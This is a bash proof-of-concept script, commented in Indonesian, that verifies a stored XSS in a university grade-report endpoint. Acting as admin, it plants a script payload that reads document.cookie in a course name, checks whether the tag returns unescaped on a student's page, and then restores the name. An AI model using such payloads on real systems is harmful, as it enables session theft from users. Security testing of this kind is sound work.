#!/usr/bin/env bash
# S4 - Stored XSS pada nama mata kuliah, dipantulkan ke KHS (GET /api/nilai/me/khs)
# Sink: src/controllers/nilaiController.js halamanKhs() -> <td>${i.nama}</td> tanpa escapeHtml
# Prasyarat: aktor pembuat payload adalah admin (satu-satunya yang boleh ubah mata kuliah);
# korban adalah mahasiswa mana pun yang mengambil mata kuliah tsb dan membuka KHS di browser.
# ID mata kuliah dicari dinamis lewat kode (bukan di-hardcode, karena id dibuat gen_random_uuid()).
# Skrip ini MEMULIHKAN nama mata kuliah ke nilai semula di akhir.
set -euo pipefail
cd "$(dirname "$0")"
source ./00-login.sh
B="$BASE_URL"; AH="Authorization: Bearer $ADMIN_TOKEN"; ANH="Authorization: Bearer $ANDI_TOKEN"
KODE_SASARAN="${KODE_MK:-IF1002}"   # mata kuliah yang diambil andi di semester 2026-ganjil
PAYLOAD='<script>window.__xss_poc_s4=document.cookie||1</script>'

MK_ID=$(curl -s -m 10 -G "$B/api/mata-kuliah" --data-urlencode "limit=100" -H "$AH" \
  | node -e "let d='';process.stdin.on('data',c=>d+=c);process.stdin.on('end',()=>{const j=JSON.parse(d);const m=j.data.find(x=>x.kode==='$KODE_SASARAN');if(!m){process.exit(1)}process.stdout.write(m.id+'|'+m.nama)})")
MK_ID_ONLY="${MK_ID%%|*}"; ASLI="${MK_ID#*|}"
echo "Target: $KODE_SASARAN id=$MK_ID_ONLY nama asli='$ASLI'"

cleanup() {
  curl -s -m 10 -X PUT "$B/api/mata-kuliah/$MK_ID_ONLY" -H "$AH" -H 'Content-Type: application/json' \
    -d "{\"nama\":\"$ASLI\",\"sks\":4}" >/dev/null
  echo "(nama mata kuliah dipulihkan ke '$ASLI')" >&2
}
trap cleanup EXIT

echo "== Admin ubah nama mata kuliah jadi payload XSS =="
curl -s -m 10 -X PUT "$B/api/mata-kuliah/$MK_ID_ONLY" -H "$AH" -H 'Content-Type: application/json' \
  -d "{\"nama\":\"$PAYLOAD\",\"sks\":4}" >/dev/null

echo "== Mahasiswa (andi) buka KHS, cek apakah payload lolos tanpa di-escape =="
HTML=$(curl -s -m 10 -G "$B/api/nilai/me/khs" --data-urlencode "semester=2026-ganjil" -H "$ANH")
RAW=$(echo "$HTML" | grep -c '<script>window.__xss_poc_s4' || true)
ESCAPED=$(echo "$HTML" | grep -c '&lt;script&gt;' || true)

echo "kemunculan <script> mentah: $RAW | kemunculan &lt;script&gt; (ter-escape): $ESCAPED"
echo
if [ "$RAW" -ge 1 ]; then
  echo "KESIMPULAN: TERBUKTI. Tag <script> muncul utuh di HTML respons (tidak ter-escape), akan dieksekusi browser saat mahasiswa membuka KHS."
else
  echo "KESIMPULAN: TIDAK TERBUKTI pada percobaan ini."
fi
